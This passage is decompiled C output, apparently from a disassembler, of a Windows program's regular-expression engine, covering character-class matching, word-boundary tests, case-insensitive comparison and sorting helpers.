  if ((*param_2 != '\0') && ((*param_2 != '\n' || (param_2[1] != '\0')))) {
    return 0;
  }
  return 1;
}



undefined4 __cdecl FUN_004140d5(undefined4 param_1,char *param_2)

{
  if ((*param_2 != '\0') && (*param_2 != '\n')) {
    return 0;
  }
  return 1;
}



uint __thiscall FUN_004140ea(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  undefined3 extraout_var;
  
  cVar1 = **param_2;
  uVar3 = CONCAT31((int3)((uint)*param_2 >> 8),cVar1);
  if (cVar1 != '\0') {
    bVar2 = FUN_00414c04(*(void **)((int)this + 0xc),uVar3);
    uVar3 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return uVar3 & 0xffffff00;
}



uint __thiscall FUN_00414116(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  undefined3 extraout_var;
  
  cVar1 = **param_2;
  uVar3 = CONCAT31((int3)((uint)*param_2 >> 8),cVar1);
  if (cVar1 != '\0') {
    bVar2 = FUN_00414c52(*(void **)((int)this + 0xc),uVar3);
    uVar3 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return uVar3 & 0xffffff00;
}



bool __thiscall FUN_00414142(void *this,int param_1,undefined *param_2)

{
  undefined *puVar1;
  bool bVar2;
  char cVar3;
  
  puVar1 = param_2;
  if (*(undefined **)(param_1 + 4) == param_2) {
LAB_00414172:
    param_2._3_1_ = '\0';
  }
  else {
    param_2 = (undefined *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (!bVar2) goto LAB_00414172;
    param_2._3_1_ = '\x01';
  }
  if (*(undefined **)(param_1 + 0x14) != puVar1) {
    param_1 = CONCAT31(param_1._1_3_,puVar1[-1]);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_1);
    if (bVar2) {
      cVar3 = '\x01';
      goto LAB_00414199;
    }
  }
  cVar3 = '\0';
LAB_00414199:
  return cVar3 != param_2._3_1_;
}



undefined4 __thiscall FUN_004141aa(void *this,uint param_1,char *param_2)

{
  char *pcVar1;
  bool bVar2;
  undefined3 extraout_var;
  uint uVar3;
  char cVar4;
  
  pcVar1 = param_2;
  if (*param_2 == '\0') {
LAB_004141d4:
    cVar4 = '\0';
  }
  else {
    param_2 = (char *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (!bVar2) goto LAB_004141d4;
    cVar4 = '\x01';
  }
  if (*(char **)(param_1 + 0x14) != pcVar1) {
    param_2 = (char *)CONCAT31(param_2._1_3_,pcVar1[-1]);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    param_1 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      uVar3 = CONCAT31(extraout_var,1);
      goto LAB_004141fc;
    }
  }
  uVar3 = param_1 & 0xffffff00;
LAB_004141fc:
  return CONCAT31((int3)(uVar3 >> 8),(char)uVar3 != cVar4);
}



bool __thiscall FUN_0041420c(void *this,int param_1,undefined *param_2)

{
  undefined *puVar1;
  bool bVar2;
  char cVar3;
  
  puVar1 = param_2;
  if (*(undefined **)(param_1 + 4) == param_2) {
LAB_0041423c:
    param_2._3_1_ = '\0';
  }
  else {
    param_2 = (undefined *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (!bVar2) goto LAB_0041423c;
    param_2._3_1_ = '\x01';
  }
  if (*(undefined **)(param_1 + 0x14) != puVar1) {
    param_1 = CONCAT31(param_1._1_3_,puVar1[-1]);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_1);
    if (bVar2) {
      cVar3 = '\x01';
      goto LAB_00414263;
    }
  }
  cVar3 = '\0';
LAB_00414263:
  return cVar3 == param_2._3_1_;
}



undefined4 __thiscall FUN_00414274(void *this,uint param_1,char *param_2)

{
  char *pcVar1;
  bool bVar2;
  undefined3 extraout_var;
  uint uVar3;
  char cVar4;
  
  pcVar1 = param_2;
  if (*param_2 == '\0') {
LAB_0041429e:
    cVar4 = '\0';
  }
  else {
    param_2 = (char *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (!bVar2) goto LAB_0041429e;
    cVar4 = '\x01';
  }
  if (*(char **)(param_1 + 0x14) != pcVar1) {
    param_2 = (char *)CONCAT31(param_2._1_3_,pcVar1[-1]);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    param_1 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      uVar3 = CONCAT31(extraout_var,1);
      goto LAB_004142c6;
    }
  }
  uVar3 = param_1 & 0xffffff00;
LAB_004142c6:
  return CONCAT31((int3)(uVar3 >> 8),(char)uVar3 == cVar4);
}



undefined4 __thiscall FUN_004142d6(void *this,int param_1,undefined *param_2)

{
  undefined *puVar1;
  bool bVar2;
  bool bVar3;
  
  puVar1 = param_2;
  if (*(undefined **)(param_1 + 4) != param_2) {
    param_2 = (undefined *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (bVar2) {
      bVar2 = true;
      goto LAB_0041430a;
    }
  }
  bVar2 = false;
LAB_0041430a:
  if (*(undefined **)(param_1 + 0x14) != puVar1) {
    param_1 = CONCAT31(param_1._1_3_,puVar1[-1]);
    bVar3 = FUN_00414ca0(*(void **)((int)this + 8),param_1);
    if (bVar3) {
      return 0;
    }
  }
  if (!bVar2) {
    return 0;
  }
  return 1;
}



undefined4 __thiscall FUN_0041433b(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  bool bVar2;
  bool bVar3;
  
  pcVar1 = param_2;
  if (*param_2 != '\0') {
    param_2 = (char *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (bVar2) {
      bVar2 = true;
      goto LAB_00414367;
    }
  }
  bVar2 = false;
LAB_00414367:
  if (*(char **)(param_1 + 0x14) != pcVar1) {
    param_2 = (char *)CONCAT31(param_2._1_3_,pcVar1[-1]);
    bVar3 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (bVar3) {
      return 0;
    }
  }
  if (!bVar2) {
    return 0;
  }
  return 1;
}



undefined4 __thiscall FUN_00414399(void *this,int param_1,undefined *param_2)

{
  undefined *puVar1;
  bool bVar2;
  bool bVar3;
  
  puVar1 = param_2;
  if (*(undefined **)(param_1 + 4) != param_2) {
    param_2 = (undefined *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (bVar2) {
      bVar2 = true;
      goto LAB_004143cd;
    }
  }
  bVar2 = false;
LAB_004143cd:
  if (*(undefined **)(param_1 + 0x14) != puVar1) {
    param_1 = CONCAT31(param_1._1_3_,puVar1[-1]);
    bVar3 = FUN_00414ca0(*(void **)((int)this + 8),param_1);
    if ((bVar3) && (!bVar2)) {
      return 1;
    }
  }
  return 0;
}



undefined4 __thiscall FUN_004143fe(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  bool bVar2;
  bool bVar3;
  
  pcVar1 = param_2;
  if (*param_2 != '\0') {
    param_2 = (char *)CONCAT31(param_2._1_3_,*param_2);
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if (bVar2) {
      bVar2 = true;
      goto LAB_0041442a;
    }
  }
  bVar2 = false;
LAB_0041442a:
  if (*(char **)(param_1 + 0x14) != pcVar1) {
    param_2 = (char *)CONCAT31(param_2._1_3_,pcVar1[-1]);
    bVar3 = FUN_00414ca0(*(void **)((int)this + 8),param_2);
    if ((bVar3) && (!bVar2)) {
      return 1;
    }
  }
  return 0;
}



uint __thiscall FUN_0041445c(void *this,int param_1,char **param_2)

{
  char *pcVar1;
  
  pcVar1 = *param_2;
  if (*(char **)(param_1 + 4) != pcVar1) {
    if ((*pcVar1 == (char)*(undefined2 *)((int)this + 8)) ||
       (*pcVar1 == (char)((ushort)*(undefined2 *)((int)this + 8) >> 8))) {
      *param_2 = pcVar1 + 1;
      return CONCAT31((int3)((uint)(pcVar1 + 1) >> 8),1);
    }
  }
  return (uint)pcVar1 & 0xffffff00;
}



uint __thiscall FUN_00414487(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  
  pcVar2 = *param_2;
  cVar1 = *pcVar2;
  if ((cVar1 == '\0') ||
     ((cVar1 != (char)*(undefined2 *)((int)this + 8) &&
      (cVar1 != (char)((ushort)*(undefined2 *)((int)this + 8) >> 8))))) {
    uVar3 = (uint)pcVar2 & 0xffffff00;
  }
  else {
    *param_2 = pcVar2 + 1;
    uVar3 = CONCAT31((int3)((uint)(pcVar2 + 1) >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_004144ad(void *this,int *param_1,char **param_2)

{
  char *pcVar1;
  uint uVar2;
  char **ppcVar3;
  char *pcVar4;
  
  pcVar1 = (char *)(*(int *)((int)this + 8) * 0x1a);
  ppcVar3 = (char **)(pcVar1 + *param_1);
  if (*(char *)(ppcVar3 + 2) == '\0') {
LAB_004144f0:
    uVar2 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    pcVar1 = *ppcVar3;
    pcVar4 = *param_2;
    if (ppcVar3[1] != pcVar1) {
      do {
        if (((char *)param_1[1] == pcVar4) || (*pcVar4 != *pcVar1)) goto LAB_004144f0;
        pcVar4 = pcVar4 + 1;
        pcVar1 = pcVar1 + 1;
      } while (ppcVar3[1] != pcVar1);
    }
    *param_2 = pcVar4;
    uVar2 = CONCAT31((int3)((uint)pcVar1 >> 8),1);
  }
  return uVar2;
}



uint __thiscall FUN_004144f4(void *this,int *param_1,char **param_2)

{
  char **ppcVar1;
  uint uVar2;
  char *pcVar4;
  char **ppcVar3;
  
  ppcVar1 = (char **)(*(int *)((int)this + 8) * 0x1a + *param_1);
  ppcVar3 = ppcVar1;
  if (*(char *)(ppcVar1 + 2) == '\0') {
LAB_00414527:
    uVar2 = (uint)ppcVar3 & 0xffffff00;
  }
  else {
    ppcVar3 = (char **)ppcVar1[1];
    pcVar4 = *param_2;
    for (ppcVar1 = (char **)*ppcVar1; ppcVar3 != ppcVar1; ppcVar1 = (char **)((int)ppcVar1 + 1)) {
      if ((*pcVar4 == '\0') || (*pcVar4 != *(char *)ppcVar1)) goto LAB_00414527;
      pcVar4 = pcVar4 + 1;
    }
    *param_2 = pcVar4;
    uVar2 = CONCAT31((int3)((uint)ppcVar3 >> 8),1);
  }
  return uVar2;
}



uint __thiscall FUN_00414534(void *this,int *param_1,char **param_2)

{
  char *pcVar1;
  bool bVar2;
  char **ppcVar3;
  undefined3 extraout_var;
  uint uVar4;
  char *pcVar5;
  char *pcVar6;
  
  ppcVar3 = (char **)(*(int *)((int)this + 8) * 0x1a + *param_1);
  if (*(char *)(ppcVar3 + 2) == '\0') {
LAB_00414578:
    uVar4 = (uint)ppcVar3 & 0xffffff00;
  }
  else {
    pcVar1 = ppcVar3[1];
    pcVar5 = *param_2;
    for (pcVar6 = *ppcVar3; pcVar1 != pcVar6; pcVar6 = pcVar6 + 1) {
      ppcVar3 = (char **)param_1;
      if ((char *)param_1[1] == pcVar5) goto LAB_00414578;
      bVar2 = FUN_00414b1b(*pcVar5,*pcVar6);
      ppcVar3 = (char **)CONCAT31(extraout_var,bVar2);
      if (bVar2) goto LAB_00414578;
      pcVar5 = pcVar5 + 1;
    }
    *param_2 = pcVar5;
    uVar4 = CONCAT31((int3)((uint)param_2 >> 8),1);
  }
  return uVar4;
}



uint __thiscall FUN_0041458a(void *this,int *param_1,char **param_2)

{
  char cVar1;
  char *pcVar2;
  bool bVar3;
  char **ppcVar4;
  undefined3 extraout_var;
  uint uVar5;
  char *pcVar6;
  char *pcVar7;
  
  ppcVar4 = (char **)(*(int *)((int)this + 8) * 0x1a + *param_1);
  if (*(char *)(ppcVar4 + 2) == '\0') {
LAB_004145c9:
    uVar5 = (uint)ppcVar4 & 0xffffff00;
  }
  else {
    pcVar2 = ppcVar4[1];
    pcVar6 = *param_2;
    pcVar7 = *ppcVar4;
    ppcVar4 = param_2;
    for (; pcVar2 != pcVar7; pcVar7 = pcVar7 + 1) {
      cVar1 = *pcVar6;
      ppcVar4 = (char **)CONCAT31((int3)((uint)ppcVar4 >> 8),cVar1);
      if (cVar1 == '\0') goto LAB_004145c9;
      bVar3 = FUN_00414b1b(cVar1,*pcVar7);
      ppcVar4 = (char **)CONCAT31(extraout_var,bVar3);
      if (bVar3) goto LAB_004145c9;
      pcVar6 = pcVar6 + 1;
    }
    *param_2 = pcVar6;
    uVar5 = CONCAT31((int3)((uint)param_2 >> 8),1);
  }
  return uVar5;
}



uint __thiscall FUN_004145db(void *this,int param_1,char **param_2)

{
  char *pcVar1;
  char *pcVar2;
  char *pcVar3;
  
  pcVar1 = *(char **)((int)this + 8);
  pcVar2 = *param_2;
  if (*(char **)((int)this + 0xc) != pcVar1) {
    pcVar3 = pcVar1;
    do {
      if ((*(char **)(param_1 + 4) == pcVar2) ||
         (pcVar1 = (char *)CONCAT31((int3)((uint)pcVar1 >> 8),*pcVar3), *pcVar3 != *pcVar2)) {
        return (uint)pcVar1 & 0xffffff00;
      }
      pcVar2 = pcVar2 + 1;
      pcVar3 = pcVar3 + 1;
    } while (*(char **)((int)this + 0xc) != pcVar3);
  }
  *param_2 = pcVar2;
  return CONCAT31((int3)((uint)pcVar1 >> 8),1);
}



int __thiscall FUN_00414615(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  uint3 uVar3;
  char *pcVar2;
  char *pcVar4;
  char *pcVar5;
  
  pcVar5 = *(char **)((int)this + 8);
  pcVar4 = *param_2;
  pcVar2 = pcVar5;
  while( true ) {
    uVar3 = (uint3)((uint)pcVar2 >> 8);
    if (*(char **)((int)this + 0xc) == pcVar5) {
      *param_2 = pcVar4;
      return CONCAT31(uVar3,1);
    }
    cVar1 = *pcVar4;
    pcVar2 = (char *)CONCAT31(uVar3,cVar1);
    if ((cVar1 == '\0') || (*pcVar5 != cVar1)) break;
    pcVar4 = pcVar4 + 1;
    pcVar5 = pcVar5 + 1;
  }
  return (uint)uVar3 << 8;
}



undefined4 __thiscall FUN_00414646(void *this,int param_1,char **param_2)

{
  char *pcVar1;
  int iVar2;
  char *pcVar3;
  
  pcVar1 = *(char **)((int)this + 8);
  pcVar3 = *param_2;
  if (*(char **)((int)this + 0xc) != pcVar1) {
    iVar2 = *(int *)((int)this + 0x14) - (int)pcVar1;
    do {
      if ((*(char **)(param_1 + 4) == pcVar3) ||
         ((*pcVar1 != *pcVar3 && (pcVar1[iVar2] != *pcVar3)))) {
        return (uint)pcVar1 & 0xffffff00;
      }
      pcVar3 = pcVar3 + 1;
      pcVar1 = pcVar1 + 1;
    } while (*(char **)((int)this + 0xc) != pcVar1);
  }
  *param_2 = pcVar3;
  return CONCAT31((int3)((uint)param_2 >> 8),1);
}



undefined4 __thiscall FUN_00414695(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  
  pcVar2 = *(char **)((int)this + 8);
  pcVar3 = *param_2;
  if (*(char **)((int)this + 0xc) != pcVar2) {
    iVar4 = *(int *)((int)this + 0x14) - (int)pcVar2;
    do {
      cVar1 = *pcVar3;
      if ((cVar1 == '\0') || ((*pcVar2 != cVar1 && (pcVar2[iVar4] != cVar1)))) {
        return (uint)pcVar2 & 0xffffff00;
      }
      pcVar3 = pcVar3 + 1;
      pcVar2 = pcVar2 + 1;
    } while (*(char **)((int)this + 0xc) != pcVar2);
  }
  *param_2 = pcVar3;
  return CONCAT31((int3)((uint)param_2 >> 8),1);
}



int __fastcall FUN_004146d8(int param_1)

{
  return *(int *)(param_1 + 0x418) + -8;
}



void __fastcall FUN_004146e4(int param_1)

{
  undefined4 uVar1;
  int iVar2;
  ushort *puVar3;
  ushort *puVar4;
  ushort *puVar5;
  ushort *puVar6;
  
  puVar4 = *(ushort **)(param_1 + 4);
  *(undefined4 *)(param_1 + 4) = 0;
  do {
    if (puVar4 == (ushort *)0x0) {
      return;
    }
    puVar6 = *(ushort **)(param_1 + 4);
    puVar3 = (ushort *)0x0;
    puVar5 = puVar6;
    if (puVar6 == (ushort *)0x0) {
LAB_00414723:
      *(ushort **)(param_1 + 4) = puVar4;
      puVar4 = *(ushort **)(puVar4 + 2);
      iVar2 = *(int *)(param_1 + 4);
    }
    else {
      do {
        uVar1 = FUN_00413e15(puVar4,puVar5);
        puVar6 = puVar5;
        if ((char)uVar1 != '\0') break;
        puVar6 = *(ushort **)(puVar5 + 2);
        puVar3 = puVar5;
        puVar5 = puVar6;
      } while (puVar6 != (ushort *)0x0);
      if (puVar3 == (ushort *)0x0) goto LAB_00414723;
      *(ushort **)(puVar3 + 2) = puVar4;
      puVar4 = *(ushort **)(puVar4 + 2);
      iVar2 = *(int *)(puVar3 + 2);
    }
    *(ushort **)(iVar2 + 4) = puVar6;
  } while( true );
}



void __thiscall FUN_0041473a(void *this,undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = *(int *)((int)this + 0x418);
  puVar2 = (undefined4 *)(iVar1 + -8);
  *param_1 = *puVar2;
  param_1[1] = *(undefined4 *)(iVar1 + -4);
  FUN_0040c040(this,(int)puVar2);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __cdecl FUN_0041475c(undefined *param_1,undefined *param_2)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004163cf;
  local_10 = ExceptionList;
  local_8 = 0;
  if (param_1 != (undefined *)0x0) {
    this = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
           (param_1 + 1);
    ExceptionList = &local_10;
    *param_1 = *param_2;
    *this = param_1._3_1_;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (this,false);
    local_8 = CONCAT31(local_8._1_3_,1);
    FUN_0040baf0(this,(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       *)(param_2 + 1));
  }
  ExceptionList = local_10;
  return;
}



int __thiscall FUN_0041482d(void *this,int param_1)

{
  uint uVar1;
  int iVar2;
  short sVar3;
  uint *puVar4;
  uint *puVar5;
  int iVar6;
  undefined4 *puVar7;
  undefined2 *puVar8;
  short *psVar9;
  
  iVar2 = param_1;
  if (*(char *)(param_1 + 4) == '\0') {
    puVar4 = (uint *)((int)this + 6);
    puVar5 = (uint *)(param_1 + 6);
    iVar6 = 8;
    do {
      uVar1 = *puVar5;
      puVar5 = puVar5 + 1;
      *puVar4 = *puVar4 | uVar1;
      puVar4 = puVar4 + 1;
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
    for (puVar7 = *(undefined4 **)(param_1 + 0x29); puVar7 != (undefined4 *)0x0;
        puVar7 = (undefined4 *)puVar7[1]) {
      FUN_00414b43((void *)((int)this + 0x28),puVar7);
    }
    *(ushort *)((int)this + 0x26) = *(ushort *)((int)this + 0x26) | *(ushort *)(iVar2 + 0x26);
    for (puVar8 = *(undefined2 **)(iVar2 + 0x2e); puVar8 != (undefined2 *)0x0;
        puVar8 = *(undefined2 **)(puVar8 + 1)) {
      FUN_00414a91((void *)((int)this + 0x2d),puVar8);
    }
    for (puVar7 = *(undefined4 **)(iVar2 + 0x33); puVar7 != (undefined4 *)0x0;
        puVar7 = (undefined4 *)puVar7[1]) {
      FUN_00414b43((void *)((int)this + 0x32),puVar7);
    }
  }
  else if (((*(short *)(param_1 + 0x26) == 0) && (*(int *)(param_1 + 0x2e) == 0)) &&
          (*(int *)(param_1 + 0x33) == 0)) {
    param_1 = param_1 + 6;
    FUN_0040bc21((void *)((int)this + 6),&param_1);
    psVar9 = *(short **)(iVar2 + 0x29);
    sVar3 = 0xff;
    if (psVar9 != (short *)0x0) {
      do {
        if (*psVar9 != 0x100) {
          param_1 = CONCAT22(*psVar9 + -1,sVar3 + 1);
          FUN_00414b43((void *)((int)this + 0x28),&param_1);
        }
        sVar3 = psVar9[1];
        psVar9 = *(short **)(psVar9 + 2);
      } while (psVar9 != (short *)0x0);
      if (sVar3 == -1) {
        return (int)this;
      }
    }
    param_1 = CONCAT22(0xffff,sVar3 + 1);
    FUN_00414b43((void *)((int)this + 0x28),&param_1);
  }
  else {
    FUN_00414b43((void *)((int)this + 0x32),&param_1);
  }
  return (int)this;
}



void __thiscall FUN_00414933(void *this,byte param_1,char param_2)

{
  int iVar1;
  
  if (param_2 == '\0') {
    FUN_0040828d((void *)((int)this + 6),param_1);
  }
  else {
    iVar1 = tolower((int)(char)param_1);
    FUN_0040828d((void *)((int)this + 6),(byte)iVar1);
    iVar1 = toupper((int)(char)param_1);
    FUN_0040828d((void *)((int)this + 6),(byte)iVar1);
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_00414977(void *this,byte param_1,uint param_2,char param_3)

{
  uint *puVar1;
  size_t sVar2;
  uint uVar3;
  uint uVar4;
  undefined *local_3c [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_20 [16];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004163e5;
  local_10 = ExceptionList;
  if (param_1 <= (byte)param_2) {
    if (param_3 == '\0') {
      for (uVar4 = (uint)param_1; uVar4 <= (param_2 & 0xff); uVar4 = uVar4 + 1) {
        puVar1 = (uint *)((int)this + ((uVar4 & 0xff) >> 5) * 4 + 6);
        *puVar1 = *puVar1 | 1 << (sbyte)((ulonglong)(uVar4 & 0xff) % 0x20);
      }
    }
    else {
      ExceptionList = &local_10;
      for (uVar4 = (uint)param_1; uVar4 <= (param_2 & 0xff); uVar4 = uVar4 + 1) {
        param_1 = (byte)uVar4;
        uVar3 = toupper((int)(char)param_1);
        puVar1 = (uint *)((int)this + ((uVar3 & 0xff) >> 5) * 4 + 6);
        *puVar1 = *puVar1 | 1 << (sbyte)((ulonglong)(uVar3 & 0xff) % 0x20);
        uVar3 = tolower((int)(char)param_1);
        puVar1 = (uint *)((int)this + ((uVar3 & 0xff) >> 5) * 4 + 6);
        *puVar1 = *puVar1 | 1 << (sbyte)((ulonglong)(uVar3 & 0xff) % 0x20);
      }
    }
    ExceptionList = local_10;
    return;
  }
  local_20[0] = param_2._3_1_;
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_20,false);
  sVar2 = strlen(s_invalid_range_specified_in_chara_0041c4d4);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (local_20,s_invalid_range_specified_in_chara_0041c4d4,sVar2);
  local_8 = 0;
  std::logic_error::logic_error((logic_error *)local_3c,local_20);
  local_3c[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_3c,(ThrowInfo *)&DAT_004196f8);
}



void __thiscall FUN_00414a91(void *this,undefined2 *param_1)

{
  undefined4 *puVar1;
  undefined2 local_a;
  undefined2 uStack_8;
  
  puVar1 = (undefined4 *)operator_new(6);
  local_a = (undefined2)*(undefined4 *)((int)this + 1);
  uStack_8 = (undefined2)((uint)*(undefined4 *)((int)this + 1) >> 0x10);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = CONCAT22(local_a,*param_1);
    *(undefined2 *)(puVar1 + 1) = uStack_8;
  }
  *(undefined4 **)((int)this + 1) = puVar1;
  return;
}



bool __cdecl FUN_00414b1b(char param_1,char param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = toupper((int)param_2);
  iVar2 = toupper((int)param_1);
  return (char)iVar2 != (char)iVar1;
}



void __thiscall FUN_00414b43(void *this,undefined4 *param_1)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)operator_new(8);
  uVar1 = *(undefined4 *)((int)this + 1);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    puVar2[1] = uVar1;
  }
  *(undefined4 **)((int)this + 1) = puVar2;
  return;
}



void __cdecl FUN_00414b67(char *param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  
  iVar2 = (int)param_2 - (int)param_1;
  while (0x10 < iVar2) {
    cVar1 = FUN_00414dd4(*param_1,param_1[iVar2 / 2],param_2[-1]);
    pcVar3 = (char *)FUN_00414e01(param_1,param_2,cVar1);
    if ((int)pcVar3 - (int)param_1 < (int)param_2 - (int)pcVar3) {
      FUN_00414b67(param_1,pcVar3);
      param_1 = pcVar3;
    }
    else {
      FUN_00414b67(pcVar3,param_2);
      param_2 = pcVar3;
    }
    iVar2 = (int)param_2 - (int)param_1;
  }
  return;
}



void __thiscall FUN_00414bd2(void *this,undefined *param_1)

{
  undefined *puVar1;
  
  puVar1 = (undefined *)FUN_0040c014(this,4);
  if (puVar1 != (undefined *)0x0) {
    *puVar1 = *param_1;
  }
  return;
}



void __thiscall FUN_00414be8(void *this,undefined *param_1)

{
  undefined *puVar1;
  
  puVar1 = (undefined *)(*(int *)((int)this + 0x418) + -4);
  *param_1 = *puVar1;
  FUN_0040c040(this,(int)puVar1);
  return;
}



bool __thiscall FUN_00414c04(void *this,undefined4 param_1)

{
  char cVar1;
  uint uVar2;
  
  if ((*(uint *)((int)this + (uint)((byte)param_1 >> 5) * 4 + 6) & 1 << (byte)param_1 % 0x20) == 0)
  {
    uVar2 = FUN_00414e2f(this,param_1);
    if ((char)uVar2 == '\0') {
      cVar1 = '\0';
      goto LAB_00414c3f;
    }
  }
  cVar1 = '\x01';
LAB_00414c3f:
  return *(char *)((int)this + 4) != cVar1;
}



bool __thiscall FUN_00414c52(void *this,undefined4 param_1)

{
  char cVar1;
  uint uVar2;
  
  if ((*(uint *)((int)this + (uint)((byte)param_1 >> 5) * 4 + 6) & 1 << (byte)param_1 % 0x20) == 0)
  {
    uVar2 = FUN_00414e99(this,param_1);
    if ((char)uVar2 == '\0') {
      cVar1 = '\0';
      goto LAB_00414c8d;
    }
  }
  cVar1 = '\x01';
LAB_00414c8d:
  return *(char *)((int)this + 4) != cVar1;
}



bool __thiscall FUN_00414ca0(void *this,undefined4 param_1)

{
  char cVar1;
  uint uVar2;
  
  if ((*(uint *)((int)this + (uint)((byte)param_1 >> 5) * 4 + 6) & 1 << (byte)param_1 % 0x20) == 0)
  {
    uVar2 = FUN_00414f03(this,param_1);
    if ((char)uVar2 == '\0') {
      cVar1 = '\0';
      goto LAB_00414cdb;
    }
  }
  cVar1 = '\x01';
LAB_00414cdb:
  return *(char *)((int)this + 4) != cVar1;
}



bool __thiscall FUN_00414cee(void *this,undefined4 param_1)

{
  char cVar1;
  uint uVar2;
  
  if ((*(uint *)((int)this + (uint)((byte)param_1 >> 5) * 4 + 6) & 1 << (byte)param_1 % 0x20) == 0)
  {
    uVar2 = FUN_00414f6d(this,param_1);
    if ((char)uVar2 == '\0') {
      cVar1 = '\0';
      goto LAB_00414d29;
    }
  }
  cVar1 = '\x01';
LAB_00414d29:
  return *(char *)((int)this + 4) != cVar1;
}



void __cdecl FUN_00414d84(char *param_1,char *param_2)

{
  char cVar1;
  char cVar2;
  char *pcVar3;
  char *pcVar4;
  
  if (param_1 != param_2) {
    for (pcVar3 = param_1 + 1; pcVar3 != param_2; pcVar3 = pcVar3 + 1) {
      cVar1 = *pcVar3;
      pcVar4 = pcVar3;
      if (cVar1 < *param_1) {
        for (; param_1 != pcVar4; pcVar4 = pcVar4 + -1) {
          *pcVar4 = pcVar4[-1];
        }
        *param_1 = cVar1;
      }
      else {
        while( true ) {
          cVar2 = pcVar4[-1];
          if (cVar2 <= cVar1) break;
          *pcVar4 = cVar2;
          pcVar4 = pcVar4 + -1;
        }
        *pcVar4 = cVar1;
      }
    }
  }
  return;
}



char __cdecl FUN_00414dd4(char param_1,char param_2,char param_3)

{
  if (param_1 < param_2) {
    if (param_3 <= param_2) {
      if (param_3 <= param_1) {
        return param_1;
      }
      return param_3;
    }
  }
  else {
    if (param_1 < param_3) {
      return param_1;
    }
    if (param_2 < param_3) {
      return param_3;
    }
  }
  return param_2;
}



void __cdecl FUN_00414e01(char *param_1,char *param_2,char param_3)

{
  char cVar1;
  
  do {
    if (param_3 <= *param_1) {
      do {
        param_2 = param_2 + -1;
      } while (param_3 < *param_2);
      if (param_2 <= param_1) {
        return;
      }
      cVar1 = *param_1;
      *param_1 = *param_2;
      *param_2 = cVar1;
    }
    param_1 = param_1 + 1;
  } while( true );
}



uint __thiscall FUN_00414e2f(void *this,undefined4 param_1)

{
  bool bVar1;
  uint in_EAX;
  int iVar2;
  uint uVar3;
  ushort *puVar4;
  void **ppvVar5;
  
  if (*(char *)((int)this + 5) != '\0') {
    return in_EAX & 0xffffff00;
  }
  puVar4 = *(ushort **)((int)this + 0x34);
  if (puVar4 == (ushort *)0x0) {
LAB_00414e69:
    ppvVar5 = *(void ***)((int)this + 0x3c);
    if (ppvVar5 != (void **)0x0) {
      do {
        bVar1 = FUN_00414ca0(*ppvVar5,param_1);
        if (bVar1) break;
        ppvVar5 = (void **)ppvVar5[1];
      } while (ppvVar5 != (void **)0x0);
      if (ppvVar5 != (void **)0x0) goto LAB_00414e90;
    }
    uVar3 = 0;
  }
  else {
    do {
      iVar2 = _isctype((int)(char)param_1,(uint)*puVar4);
      if (iVar2 == 0) break;
